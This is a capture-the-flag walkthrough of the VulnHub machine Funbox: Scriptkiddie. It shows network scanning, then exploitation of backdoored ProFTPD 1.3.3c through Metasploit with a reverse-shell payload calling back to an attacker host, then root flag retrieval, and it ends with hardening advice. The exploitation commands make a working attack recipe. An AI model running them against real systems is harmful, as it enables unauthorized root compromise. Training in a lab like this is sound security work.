# Funbox: Scriptkiddie (VulnHub)

## Overview

**Funbox: Scriptkiddie** is an Easy-level VulnHub machine created by **0815R2d2**. The machine focuses on network enumeration, service identification, vulnerability research, and exploitation of the backdoored **ProFTPD 1.3.3c** service to gain immediate root access.

This challenge demonstrates how a known backdoored FTP service can result in unauthenticated remote code execution and complete system compromise without requiring any privilege escalation.

---

## Machine Information

| Attribute | Value |
|------------|---------|
| Machine Name | Funbox: Scriptkiddie |
| Author | 0815R2d2 |
| Series | Funbox |
| Platform | VulnHub |
| Difficulty | Easy |
| Target OS | Ubuntu Linux |
| Attacker Machine | Kali Linux |
| Objective | Gain Root Access and Retrieve the Root Flag |

---

## Skills Demonstrated

- Network Discovery
- Host Enumeration
- Service Enumeration
- Nmap Scanning
- FTP Enumeration
- Vulnerability Assessment
- Exploit Research
- Searchsploit
- Metasploit Framework
- Remote Code Execution (RCE)
- Reverse Shell
- Root Shell Access
- Post Exploitation
- Security Assessment

---

## Tools Used

- arp-scan
- Nmap
- Searchsploit
- Metasploit Framework
- Linux Shell Commands
- Kali Linux

---

## Attack Methodology

1. Discover the target host.
2. Enumerate open services.
3. Identify the vulnerable ProFTPD version.
4. Research publicly available exploits.
5. Load the Metasploit exploit module.
6. Configure payload and target.
7. Execute the exploit.
8. Obtain a root shell.
9. Retrieve the root flag.

---

## Network Discovery

Identify active hosts on the local network.

```bash
sudo arp-scan -l
```

Result:

```text
192.168.1.106
```

The vulnerable machine was successfully identified.

---

## Service Enumeration

Perform a detailed Nmap scan.

```bash
sudo nmap -A -sV -sC 192.168.1.106 --min-rate 10000
```

### Open Ports

| Port | Service | Version |
|------|----------|---------|
| 21 | FTP | ProFTPD 1.3.3c |
| 22 | SSH | OpenSSH 7.2p2 |
| 25 | SMTP | Postfix |
| 80 | HTTP | Apache 2.4.18 |
| 110 | POP3 | Dovecot |
| 139 | SMB | Samba |
| 143 | IMAP | Dovecot |
| 445 | SMB | Samba 4.3.11 |

### Important Findings

- FTP service running **ProFTPD 1.3.3c**
- WordPress 5.7.2 detected
- Multiple network services exposed
- Vulnerable ProFTPD version identified

---

## Vulnerability Identification

Search for publicly available exploits.

```bash
searchsploit ProFTPD 1.3.3c
```

Results:

```text
ProFTPD 1.3.3c - Compromised Source Backdoor Remote Code Execution

ProFTPD 1.3.3c - Backdoor Command Execution (Metasploit)
```

The vulnerable FTP service contains a known backdoor allowing unauthenticated remote command execution.

---

## Exploitation

### Launch Metasploit

```bash
msfconsole -q
```

Search for the exploit module.

```bash
search ProFTPD 1.3.3c
```

Load the module.

```bash
use exploit/unix/ftp/proftpd_133c_backdoor
```

Configure the target.

```bash
set rhosts 192.168.1.106
```

Display compatible payloads.

```bash
show payloads
```

Select a reverse shell payload.

```bash
set payload cmd/unix/reverse
```

Configure the listener.

```bash
set lhost <attacker-ip>

set lport 4444
```

Execute the exploit.

```bash
exploit
```

A reverse command shell is established successfully.

---

## Initial Access

Interact with the session.

```bash
sessions -i 1
```

Verify privileges.

```bash
whoami
```

Output:

```text
root
```

The ProFTPD backdoor executes commands with root privileges, providing immediate root access.

---

## Root Flag

Navigate to the root directory.

```bash
cd /root
```

List files.

```bash
ls
```

Interesting file:

```text
root.txt
```

Read the flag.

```bash
cat root.txt
```

The machine is fully compromised.

---

## Vulnerabilities Identified

### 1. Backdoored ProFTPD 1.3.3c

A maliciously modified ProFTPD source distribution allowed arbitrary command execution.

### 2. Remote Code Execution (RCE)

Unauthenticated attackers could execute commands remotely with root privileges.

### 3. Immediate Root Shell

The exploit directly executes commands as root without requiring privilege escalation.

### 4. Excessive Service Exposure

Multiple unnecessary network services increased the attack surface.

---

## Attack Chain Summary

- Host Discovery using arp-scan
- Service Enumeration using Nmap
- Vulnerable ProFTPD Identification
- Exploit Research using Searchsploit
- Metasploit Exploitation
- Remote Code Execution
- Root Shell Access
- Root Flag Retrieval

---

## Security Recommendations

- Remove backdoored ProFTPD immediately.
- Upgrade ProFTPD to a secure supported version.
- Disable FTP if not required.
- Prefer SFTP over traditional FTP.
- Restrict administrative services to trusted hosts.
- Minimize exposed network services.
- Monitor FTP logs for suspicious commands.
- Implement continuous vulnerability scanning.
- Perform regular penetration testing.

---

## Key Learning Outcomes

- Service enumeration is the foundation of penetration testing.
- Public exploit databases quickly identify vulnerable services.
- Searchsploit simplifies exploit discovery.
- Metasploit provides rapid exploitation of known vulnerabilities.
- Backdoored software can immediately compromise entire systems.
- Patch management is essential to prevent exploitation.
- Reducing exposed services minimizes attack surface.

---

## Conclusion

Funbox: Scriptkiddie is an excellent beginner-friendly VulnHub machine that demonstrates how vulnerable services can lead directly to complete system compromise. It provides practical experience with service enumeration, exploit research, Metasploit, remote code execution, and post-exploitation while emphasizing the importance of patch management and secure service configuration.

---

**Author:** Omkar Babaji Sawant

**Repository:** VulnHub-Walkthroughs
